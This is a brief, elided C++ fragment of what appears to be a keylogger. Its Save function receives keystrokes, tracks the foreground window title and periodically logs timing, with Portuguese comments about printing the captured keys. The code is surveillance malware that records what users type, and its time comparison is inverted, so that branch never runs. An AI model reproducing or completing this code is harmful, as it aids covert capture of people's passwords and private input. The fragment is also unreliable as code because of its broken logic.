...
int Save(int key_stroke)
{
	...
	if (foreground)
	{
		...
		if (strcmp(window_title, lastwindow) != 0) {
			...
			strcpy_s(lastwindow, 256, window_title);
			
			// get time
			static time_t tempoInicial = time(NULL);
			time_t t = time(NULL);
			
			
			if (tempoInicial - t > 300)
			{
				SalvarTempo(window_title);
				tempoInicial += 300;
			}
	...
	//descomente para mostrar na tela.
	//std::cout << key_stroke << '\n';
